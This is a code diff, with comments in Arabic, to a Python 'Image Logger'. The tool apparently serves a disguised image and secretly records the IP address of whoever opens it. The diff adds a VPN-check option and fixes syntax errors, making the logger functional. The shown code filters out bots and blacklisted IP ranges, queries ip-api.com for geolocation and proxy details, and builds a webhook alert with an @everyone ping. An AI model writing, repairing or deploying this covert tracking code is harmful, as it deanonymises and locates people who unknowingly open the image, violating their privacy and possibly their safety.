@@ -15,10 +15,11 @@ config = {
     "imageArgument": True,  # يسمح لك بتغيير الصورة من خلال رابط
     "username": "Image Logger",  # اسم المستخدم الذي سيظهر في الـ webhook
     "color": 0x00FFFF,  # اللون الذي سيظهر في الـ embed
-    # باقي الإعدادات
+    "vpnCheck": 1,  # تحقق من VPN
 }
 
-blacklistedIPs = ("27", "104", "143", "164")  # قائمة IPs محظورة (اختياري)
+# قائمة IPs محظورة (اختياري)
+blacklistedIPs = ("27", "104", "143", "164")  
 
 # التحقق من الـ IP إذا كان بوت أو لا
 def botCheck(ip, useragent):
@@ -47,26 +48,28 @@ def reportError(error):
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         return
+
     bot = botCheck(ip, useragent)
     if bot:
         return
 
     ping = "@everyone"
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+    
     if info["proxy"]:
         if config["vpnCheck"] == 2:
             return
         if config["vpnCheck"] == 1:
             ping = ""
-    
+
     embed = {
         "username": config["username"],
         "content": ping,
         "embeds": [
-            }
+            {
                 "title": "Image Logger - IP Logged",
                 "color": config["color"],
-                "description": f""**A User Opened the Original Image!**
+                "description": f"""**A User Opened the Original Image!**
 
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
